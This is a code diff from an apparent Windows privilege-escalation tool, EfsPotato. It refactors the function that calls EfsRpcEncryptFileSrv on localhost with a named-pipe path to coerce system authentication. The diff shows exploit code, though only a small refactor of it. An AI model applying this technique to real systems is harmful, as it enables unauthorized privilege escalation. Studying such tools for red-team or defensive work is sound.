@@ -208,21 +208,25 @@ namespace EfsPotato.Library
         private static void TriggerPrintSpooler()
         {
             RPC_STATUS rpcStatus;
-            IntPtr hBinding = RpcHelpers.GetEfsrBindingHandle(@"\\127.0.0.1");
             string filePath = string.Format(@"\\localhost/pipe/{0}\C$\PrivFu.txt", Globals.PipeName);
-
-            if (hBinding == IntPtr.Zero)
-                return;
 
             using (var rpc = new MsEfsr())
             {
-                Console.WriteLine("[>] Calling EfsRpcEncryptFileSrv().");
-                Console.WriteLine("    [*] Target File Path: {0}", filePath.ToString());
+                IntPtr hBinding = rpc.GetEfsrBindingHandle(@"\\127.0.0.1");
 
-                rpcStatus = rpc.EfsRpcEncryptFileSrv(hBinding, filePath);
+                if (hBinding != IntPtr.Zero)
+                {
+                    Console.WriteLine("[>] Calling EfsRpcEncryptFileSrv().");
+                    Console.WriteLine("    [*] Target File Path: {0}", filePath.ToString());
+
+                    rpcStatus = rpc.EfsRpcEncryptFileSrv(hBinding, filePath);
+                    RpcHelpers.CloseBindingHandle(ref hBinding);
+                }
+                else
+                {
+                    Console.WriteLine("[-] Failed to get binding handle for rpc call.");
+                }
             }
-
-            RpcHelpers.CloseBindingHandle(ref hBinding);
         }
     }
 }
